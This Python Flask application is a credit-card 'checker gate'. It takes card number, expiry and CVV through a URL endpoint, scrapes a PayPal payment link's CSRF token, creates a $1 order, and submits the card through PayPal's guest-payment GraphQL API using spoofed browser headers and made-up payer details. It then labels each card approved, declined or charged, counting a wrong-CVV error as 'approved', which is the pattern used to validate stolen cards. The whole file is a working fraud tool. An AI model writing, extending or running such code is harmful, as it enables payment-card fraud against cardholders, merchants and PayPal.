import requests
import json
import logging
import re
import time
import uuid
import os
from flask import Flask, jsonify, request
from rq import Queue
from worker import conn
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Initialize Flask App
app = Flask(__name__)

# Initialize Redis Queue for background tasks
q = Queue(connection=conn)

# --- Configuration ---
# Move sensitive data to environment variables
PAYPAL_PAYMENT_URL = os.environ.get('PAYPAL_PAYMENT_URL', 'https://www.paypal.com/ncp/payment/R2FGT68WSSRLW')
PAYPAL_CREATE_ORDER_API = os.environ.get('PAYPAL_CREATE_ORDER_API', 'https://www.paypal.com/ncp/api/create-order')
PAYPAL_GRAPHQL_API = os.environ.get('PAYPAL_GRAPHQL_API', 'https://www.paypal.com/graphql')
MERCHANT_ID = os.environ.get('MERCHANT_ID', '32BACX6X7PYMG')
LINK_ID = os.environ.get('LINK_ID', 'R2FGT68WSSRLW')

# --- Status Mapping Rules ---
APPROVED_CODES = {"INVALID_SECURITY_CODE", "EXISTING_ACCOUNT_RESTRICTED"}
DECLINED_CODES = {
    "CARD_GENERIC_ERROR",
    "COUNTRY_NOT_SUPPORTED",
    "EXPIRED_CARD",
    "VALIDATION_ERROR",
    "LOGIN_ERROR",
    "RISK_DISALLOWED",
    "TOKEN_EXTRACTION_ERROR",
    "NETWORK_ERROR",
    "INTERNAL_ERROR",
    "INVALID_MONTH",
    "UNKNOWN_ERROR",
    "3DS_REQUIRED"
}

def extract_csrf_token(html_content):
    """Extract CSRF token from HTML content with multiple patterns."""
    try:
        patterns = [
            r'"csrfToken":"([^"]+)"',
            r'csrfToken["\']?\s*:\s*["\']([^"\']+)["\']',
            r'name=["\']csrf["\']\s+value=["\']([^"\']+)["\']',
            r'data-csrf=["\']([^"\']+)["\']',
            r'"token":"([^"]+)"',
            r'name="_token"\s+value="([^"]+)"'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html_content)
            if match:
                return match.group(1)
        
        logging.warning(f"CSRF token not found. Page content snippet: {html_content[:500]}...")
        return None
    except Exception as e:
        logging.error(f"Error extracting CSRF token: {e}")
        return None

def validate_card_details(card_details_string):
    """Validate and parse card details string."""
    parts = card_details_string.split('|')
    if len(parts) != 4:
        return None, {'code': 'VALIDATION_ERROR', 'message': 'Invalid input format. Expected: card_number|mm|yy|cvv'}

    card_number, month, year, cvv = [p.strip() for p in parts]

    if not month.isdigit() or len(month) != 2 or not (1 <= int(month) <= 12):
        return None, {'code': 'INVALID_MONTH', 'message': 'Invalid expiration month provided.'}
    if not year.isdigit():
        return None, {'code': 'VALIDATION_ERROR', 'message': 'Invalid expiration year format.'}
    if len(year) == 2: 
        year = '20' + year
    elif len(year) != 4: 
        return None, {'code': 'VALIDATION_ERROR', 'message': 'Invalid expiration year format.'}
    if not cvv.isdigit() or not (3 <= len(cvv) <= 4):
        return None, {'code': 'VALIDATION_ERROR', 'message': 'Invalid CVV format.'}

    expiry_date = f"{month}/{year}"
    card_type = 'visa' if card_number.startswith('4') else ('mastercard' if card_number.startswith('5') else ('amex' if card_number.startswith('3') else 'unknown'))
    currency_conversion_type = 'VENDOR' if card_type == 'amex' else 'PAYPAL'
    
    card_details = {
        'cardNumber': card_number, 
        'type': card_type, 
        'expirationDate': expiry_date, 
        'securityCode': cvv, 
        'name': 'Rockcy og',
        'postalCode': '10010'
    }
    
    return card_details, None

def process_paypal_payment(card_details_string):
    """
    Processes the PayPal payment using the provided card details string.
    The string should be in the format: 'card_number|mm|yy|cvv'
    Returns a dictionary with 'code' and 'message' from the PayPal response.
    """
    # --- 1. Parse and Validate Card Details ---
    card_details, error = validate_card_details(card_details_string)
    if error:
        return error
    
    # --- 2. Execute PayPal Request Sequence with Comprehensive Retry Logic ---
    session = requests.Session()
    token = None
    client_metadata_id = str(uuid.uuid4())
    
    # --- Request 1: Get CSRF Token ---
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache', 
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1'
    }
    
    try:
        response = session.get(PAYPAL_PAYMENT_URL, headers=headers, timeout=60)
        response.raise_for_status()
        csrf_token = extract_csrf_token(response.text)
        if not csrf_token:
            return {'code': 'TOKEN_EXTRACTION_ERROR', 'message': 'Failed to extract CSRF token from PayPal.'}
    except requests.exceptions.RequestException as e:
        logging.error(f"Network error while fetching initial page: {e}")
        return {'code': 'NETWORK_ERROR', 'message': 'Failed to connect to PayPal for CSRF token.'}

    # --- Request 2: Create Order ---
    headers = {
        'accept': '*/*', 
        'content-type': 'application/json', 
        'origin': 'https://www.paypal.com',
        'referer': PAYPAL_PAYMENT_URL,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'x-csrf-token': csrf_token,
        'x-requested-with': 'XMLHttpRequest',
        'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'Connection': 'keep-alive'
    }
    
    json_data = {
        'link_id': LINK_ID, 
        'merchant_id': MERCHANT_ID, 
        'quantity': '1', 
        'amount': '1',
        'currency': 'USD', 
        'currencySymbol': '$', 
        'funding_source': 'CARD',
        'button_type': 'VARIABLE_PRICE', 
        'csrfRetryEnabled': True,
        'clientMetadataId': client_metadata_id,
    }
    
    try:
        response = session.post(PAYPAL_CREATE_ORDER_API, cookies=session.cookies, headers=headers, json=json_data, timeout=60)
        response.raise_for_status()
        response_data = response.json()
    except requests.exceptions.RequestException as e:
        logging.error(f"Network error during create-order call: {e}")
        return {'code': 'NETWORK_ERROR', 'message': 'Failed to connect to PayPal create-order API.'}
    except ValueError:
        logging.error(f"Invalid JSON response from create-order: {response.text}")
        return {'code': 'TOKEN_EXTRACTION_ERROR', 'message': 'PayPal returned an invalid JSON response.'}
    
    # Check for token in multiple possible fields
    token = response_data.get('context_id') or response_data.get('token') or response_data.get('id')
    
    if not token:
        logging.error(f"Token extraction failed. Status: {response.status_code}. Response Body: {response.text}")
        return {'code': 'TOKEN_EXTRACTION_ERROR', 'message': 'Failed to extract token from PayPal response.'}

    # --- Request 3: Submit Card Details ---
    headers = {
        'accept': '*/*', 
        'content-type': 'application/json', 
        'origin': 'https://www.paypal.com',
        'paypal-client-context': token, 
        'paypal-client-metadata-id': token,
        'referer': f'https://www.paypal.com/smart/card-fields?token={token}',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'x-app-name': 'standardcardfields', 
        'x-country': 'US',
        'x-requested-with': 'XMLHttpRequest',
        'PayPal-Client-Metadata-Id': client_metadata_id,
        'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'Connection': 'keep-alive'
    }

    # Updated GraphQL query with proper structure
    graphql_query = """
    mutation payWithCard(
        $token: String!
        $card: CardInput!
        $billingAddress: AddressInput!
        $shippingAddress: AddressInput!
        $phoneNumber: String
        $firstName: String
        $lastName: String
        $email: String
        $currencyConversionType: CheckoutCurrencyConversionType
        $clientMetadataId: String
    ) {
        approveGuestPaymentWithCreditCard(
            token: $token
            card: $card
            billingAddress: $billingAddress
            shippingAddress: $shippingAddress
            phoneNumber: $phoneNumber
            firstName: $firstName
            lastName: $lastName
            email: $email
            currencyConversionType: $currencyConversionType
            clientMetadataId: $clientMetadataId
        ) {
            ... on PaymentApproveResponse {
                cart {
                    intent
                    checkoutSessionToken
                }
                payer {
                    name {
                        givenName
                        surname
                    }
                    email
                    address {
                        countryCode
                    }
                }
                status
            }
            ... on PaymentContingencyResponse {
                contingencies {
                    ... on ThreeDomainSecureContingency {
                        status
                        method
                        redirectUrl {
                            href
                        }
                    }
                }
            }
            ... on ErrorResponse {
                errors {
                    code
                    message
                    details {
                        issue
                    }
                }
            }
        }
    }
    """
    
    json_data = {
        'query': graphql_query.strip().replace("\n", ""),
        'variables': {
            'token': token, 
            'card': card_details, 
            'phoneNumber': '4073320637',
            'firstName': 'Rockcy', 
            'lastName': 'og',
            'billingAddress': {
                'givenName': 'Rockcy', 
                'familyName': 'og', 
                'line1': '15th street', 
                'city': 'ny', 
                'state': 'NY', 
                'postalCode': '10010', 
                'country': 'US'
            },
            'shippingAddress': {
                'givenName': 'Rockcy', 
                'familyName': 'og', 
                'line1': '15th street', 
                'city': 'ny', 
                'state': 'NY', 
                'postalCode': '10010', 
                'country': 'US'
            },
            'email': 'rocky2@gmail.com', 
            'currencyConversionType': 'VENDOR' if card_details['type'] == 'amex' else 'PAYPAL',
            'clientMetadataId': client_metadata_id
        }, 
        'operationName': 'payWithCard',
    }
    
    try:
        response = session.post(PAYPAL_GRAPHQL_API, cookies=session.cookies, headers=headers, json=json_data, timeout=60)
        response.raise_for_status()
        response_data = response.json()
    except (ValueError, requests.exceptions.RequestException) as e:
        logging.error(f"Final GraphQL request failed. Status: {response.status_code}. Error: {e}")
        logging.error(f"Response Headers: {response.headers}")
        logging.error(f"Response Body: {response.text}")
        return {'code': 'INTERNAL_ERROR', 'message': 'Failed to submit payment to PayPal.'}

    # --- 3. Parse PayPal Response ---
    result = {'code': 'TRANSACTION_SUCCESSFUL', 'message': 'Payment processed successfully.'}
    
    # Check for errors in different possible locations
    if 'errors' in response_data and response_data['errors']:
        logging.error(f"PayPal GraphQL error: {json.dumps(response_data)}")
        error_data = response_data['errors'][0]
        result['code'] = error_data.get('code', 'UNKNOWN_ERROR')
        result['message'] = error_data.get('message', 'An unknown error occurred.')
    elif 'data' in response_data and response_data['data'] and 'approveGuestPaymentWithCreditCard' in response_data['data']:
        payment_result = response_data['data']['approveGuestPaymentWithCreditCard']
        if 'errors' in payment_result and payment_result['errors']:
            error_data = payment_result['errors'][0]
            result['code'] = error_data.get('code', 'UNKNOWN_ERROR')
            result['message'] = error_data.get('message', 'An unknown error occurred.')
        elif 'contingencies' in payment_result and payment_result['contingencies']:
            result['code'] = '3DS_REQUIRED'
            result['message'] = '3D Secure authentication is required.'
    
    return result

def background_process_payment(card_details):
    """Background task to process payment without blocking the main thread."""
    result = process_paypal_payment(card_details)
    return result

@app.route('/gate=pp1/cc=<card_details>')
def payment_gateway(card_details):
    """
    Main endpoint to process a payment.
    URL Format: /gate=pp1/cc={card_number|mm|yy|cvv}
    """
    last_four = card_details.split('|')[0][-4:] if '|' in card_details and len(card_details.split('|')[0]) >= 4 else '****'
    logging.info(f"Received payment request for card ending in {last_four}")
    
    # Enqueue the payment processing task
    job = q.enqueue(background_process_payment, card_details)
    
    # Return the job ID immediately
    return jsonify({
        "status": "processing",
        "job_id": job.id,
        "message": "Payment processing started. Check status with /status/{job_id}"
    })

@app.route('/status/<job_id>')
def check_status(job_id):
    """Check the status of a payment processing job."""
    job = q.fetch_job(job_id)
    
    if job is None:
        return jsonify({"status": "error", "message": "Job not found"}), 404
    
    if job.is_finished:
        result = job.result
        code = result.get('code')
        status = 'approved' if code in APPROVED_CODES else ('declined' if code in DECLINED_CODES else 'charged')
        return jsonify({"status": status, "code": code, "message": result.get('message')})
    elif job.is_failed:
        return jsonify({"status": "declined", "code": "WORKER_ERROR", "message": str(job.exc_info)}), 500
    else:
        return jsonify({"status": "processing", "message": "Payment is still being processed."})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
